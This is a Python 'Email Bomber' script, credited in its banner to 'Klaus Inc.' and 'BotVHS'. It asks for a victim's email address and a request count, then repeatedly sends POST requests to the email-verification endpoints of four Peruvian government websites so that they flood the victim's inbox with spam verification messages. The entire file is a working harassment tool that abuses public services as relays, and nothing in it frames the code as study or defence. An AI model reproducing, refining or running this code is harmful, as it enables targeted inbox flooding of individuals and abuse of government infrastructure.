import requests
import json
import argparse
import platform
import os

# Detectar el sistema operativo
if platform.system() == "Windows":
    clear_command = "cls"
else:
    clear_command = "clear"

# Ejecutar el comando para limpiar la consola
os.system(clear_command)

# Imprimir el mensaje de bienvenida
print("                                      ***********************************************                                        ")
print("                                      *                                             *                                        ")
print("                                      *          KLAUS INC. - Email Bomber          *                                        ")
print("                                      *                 By: BotVHS                  *                                        ")
print("                                      *                                             *                                        ")
print("                                      ***********************************************                                        ")

parser = argparse.ArgumentParser(description='Realizar peticiones a la API de Verificación de correo')
parser.add_argument('email', nargs='?', type=str, help='Correo electrónico al que se enviarán las peticiones')
parser.add_argument('cantidad', nargs='?', type=int, help='Cantidad de peticiones que se desean realizar')
args = parser.parse_args()

if not args.email:
    email = input('Ingresa el correo electrónico al que se enviarán las peticiones: ')
else:
    email = args.email

if not args.cantidad:
    cantidad = int(input('Ingresa la cantidad de peticiones que se desean realizar: '))
else:
    cantidad = args.cantidad

url1 = 'https://mesadepartes.pronabec.gob.pe/Registro/Verificacion_correo'
payload1 = {"codigo": "999999", "correo": email, "nombre": "Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS"}
headers1 = {"Content-Type": "application/json"}

url2 = 'https://5c2aselbaend78.mtc.gob.pe/api/Account/validacionCorreoElectronicoweb'
payload2 = {"Email":email}
headers2 = {"Content-Type": "application/json"}

url3 = 'https://tramidigital.regionlalibertad.gob.pe/Home/Verificar'
payload3 = {"correo":email}

url4 = 'https://webexterno.sutran.gob.pe/WebExterno/Pages/SolicitudAIP/TramiteGeneral.aspx/ValidaCorreo'
payload4 = {"codVerif":"Atención, Esto es un mensaje masivo de Klaus Inc. desarrollado por BotVHS","correo":email,"nroDoc":"44444444"}


contador_peticiones = 0
for i in range(cantidad):
    if contador_peticiones >= cantidad:
        break

    try:
        response1 = requests.post(url1, data=json.dumps(payload1), headers=headers1, timeout=10)
        if response1.status_code == 200:
            contador_peticiones += 1
            print(f"Peticion {contador_peticiones} a {email} exitoso")
        else:
            print(f"Error en la peticion {contador_peticiones} a {email}. Codigo de estado: {response1.status_code}")
        if contador_peticiones >= cantidad:
            break
    except requests.exceptions.Timeout:
        print(f"No se ha podido procesar esta petición")
        if contador_peticiones >= cantidad:
            break
        continue

    try:
        response2 = requests.post(url2, data=json.dumps(payload2), headers=headers2)
        if response1.status_code == 200:
            contador_peticiones += 1
            print(f"Peticion {contador_peticiones} a {email} exitoso")
        else:
            print(f"Error en la API 2 a {email}. Codigo de estado: {response2.status_code}")
        if contador_peticiones >= cantidad:
            break
    except requests.exceptions.Timeout:
        print(f"No se ha podido procesar esta petición")
        if contador_peticiones >= cantidad:
            break
        continue

    
    try:
        response3 = requests.post(url3, data=json.dumps(payload3))
        if response3.status_code == 200:
            contador_peticiones += 1
            print(f"Peticion {contador_peticiones} a {email} exitoso")
        else:
            contador_peticiones += 1
            print(f"Error en la API 3 a {email}. Codigo de estado: {response2.status_code}")
        if contador_peticiones >= cantidad:
            break
    except requests.exceptions.Timeout:
        print(f"No se ha podido procesar esta petición")
        if contador_peticiones >= cantidad:
            break
        continue

    
    try:
        response4 = requests.post(url4, data=json.dumps(payload4))
        if response4.status_code == 200:
            contador_peticiones += 1
            print(f"Peticion {contador_peticiones} a {email} exitoso")
        else:
            print(f"Error en la peticion {contador_peticiones} a {email}. Codigo de estado: {response4.status_code}")
        if contador_peticiones >= cantidad:
            break
    except requests.exceptions.Timeout:
        print(f"No se ha podido procesar esta petición")
        if contador_peticiones >= cantidad:
            break
        continue

